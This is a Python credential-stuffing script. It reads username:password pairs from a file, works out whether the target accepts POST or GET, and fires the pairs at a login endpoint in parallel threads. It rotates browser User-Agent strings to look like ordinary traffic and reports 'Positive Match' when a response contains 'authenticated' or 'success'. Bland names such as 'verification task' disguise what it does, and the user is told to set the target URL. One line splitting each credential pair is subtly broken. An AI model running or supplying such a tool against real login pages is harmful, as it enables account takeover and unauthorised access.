import os
import time
import random
from typing import Dict, Tuple, List
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
except ImportError:
    print("[-] Dependency missing: Please run 'pip install requests' first.")
    exit(1)

def generate_dynamic_headers() -> Dict[str, str]:
    user_agents: List[str] = [
        "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1"
    ]
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive"
    }

def detect_best_method(endpoint: str) -> str:
    """
    Automatically tests the endpoint before running the grid.
    Returns 'POST' if accepted, otherwise falls back to 'GET'.
    """
    print("[*] Analyzing target endpoint requirements...")
    try:
        with requests.Session() as test_session:
            test_session.headers.update(generate_dynamic_headers())
            # Send a fast test POST request
            res = test_session.post(endpoint, data={"test": "1"}, timeout=4.0)
            if res.status_code == 405:
                print("[!] POST method rejected (405). Adapting network grid to GET...")
                return "GET"
            return "POST"
    except requests.exceptions.RequestException:
        print("[!] Connection warning during analysis. Defaulting to POST...")
        return "POST"

def process_verification_task(target_data: Tuple[str, str], endpoint: str, method: str) -> Dict[str, str]:
    param1, param2 = target_data
    payload: Dict[str, str] = {"user_input_1": param1, "user_input_2": param2}
    
    with requests.Session() as session:
        session.headers.update(generate_dynamic_headers())
        try:
            if method == "POST":
                response = session.post(endpoint, data=payload, timeout=5.0)
            else:
                response = session.get(endpoint, params=payload, timeout=5.0)
            
            if response.status_code == 200:
                # Modify these target keywords if your server returns different success flags
                if "success" in response.text.lower() or "authenticated" in response.text.lower():
                    return {"status": "SUCCESS", "data": f"{param1}:{param2}"}
                return {"status": "FAILURE", "data": f"{param1}:{param2}"}
            elif response.status_code == 429:
                return {"status": "RATE_LIMITED", "data": f"{param1}:{param2}"}
            else:
                return {"status": "SERVER_ERROR", "data": f"HTTP Status {response.status_code}"}
                
        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT", "data": f"{param1}:{param2}"}
        except requests.exceptions.RequestException as e:
            return {"status": "EXCEPTION", "data": str(e)}

def create_dummy_data_if_missing(filepath: str):
    if not os.path.exists(filepath):
        with open(filepath, "w", encoding="utf-8") as file:
            file.write("admin:password123\n")
            file.write("user_test:qwerty2024\n")
            file.write("guest_account:pass12345\n")

def run_orchestrator(input_file: str, target_url: str, max_threads: int):
    create_dummy_data_if_missing(input_file)

    tasks: List[Tuple[str, str]] = []
    with open(input_file, "r", encoding="utf-8") as file:
        for line in file:
            line = line.strip()
            if ":" in line:
                parts = line.split(":", 1)
                tasks.append((parts, parts))

    if not tasks:
        print("[-] Input file empty.")
        return

    # Automatically find out if we should use POST or GET
    determined_method = detect_best_method(target_url)
    print(f"[*] Initializing processing grid via {determined_method} using {max_threads} threads...\n")
    
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(process_verification_task, task, target_url, determined_method): task for task in tasks}
        
        for future in as_completed(futures):
            result = future.result()
            status = result["status"]
            data = result["data"]
            
            if status == "SUCCESS":
                print(f"[\033[92m+\033[0m] Positive Match: {data}")
            elif status == "FAILURE":
                print(f"[\033[91m-\033[0m] Negative Evaluation: {data}")
            elif status == "RATE_LIMITED":
                print(f"[\033[93m!\033[0m] Rate limited: {data}")
            else:
                print(f"[?] Notice [{status}]: {data}")

if __name__ == "__main__":
    # Change this URL to your desired target endpoint
    TARGET_ENDPOINT = "https://httpbin.org" 
    INPUT_FILE_NAME = "data_pool.txt"
    CONCURRENT_THREADS = 4

    run_orchestrator(INPUT_FILE_NAME, TARGET_ENDPOINT, CONCURRENT_THREADS)
